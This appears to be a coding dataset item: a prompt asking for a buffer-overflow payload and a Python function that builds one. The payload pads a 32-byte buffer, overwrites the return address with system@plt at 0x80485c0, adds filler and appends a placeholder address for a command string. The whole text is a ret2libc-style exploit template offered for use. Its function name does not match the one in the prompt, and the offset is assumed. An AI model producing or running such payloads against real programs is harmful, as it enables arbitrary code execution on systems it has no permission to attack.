"""
QUESTION:
Construct a payload to exploit a buffer overflow vulnerability in the `change(name)` function that takes a string `name` as input, to execute arbitrary code by overwriting the return address with the address of `system_plt` at memory address `0x80485c0`, followed by the address of a string containing the command to be executed. The payload should not rely on external libraries or dependencies.
"""

import struct

def entrance(name):
    # Address of the system function in little-endian format
    system_plt_address = struct.pack("<I", 0x80485c0)

    # Address of the command string in little-endian format
    command_address = struct.pack("<I", 0xdeadbeef)  # Replace with the address of your command string

    # Craft the payload
    payload = b'A' * 32  # Fill the buffer to reach the return address
    payload += system_plt_address  # Overwrite the return address with the address of system_plt
    payload += b'BBBB'  # Padding to align with the expected stack frame
    payload += command_address  # Address of the command string

    return payload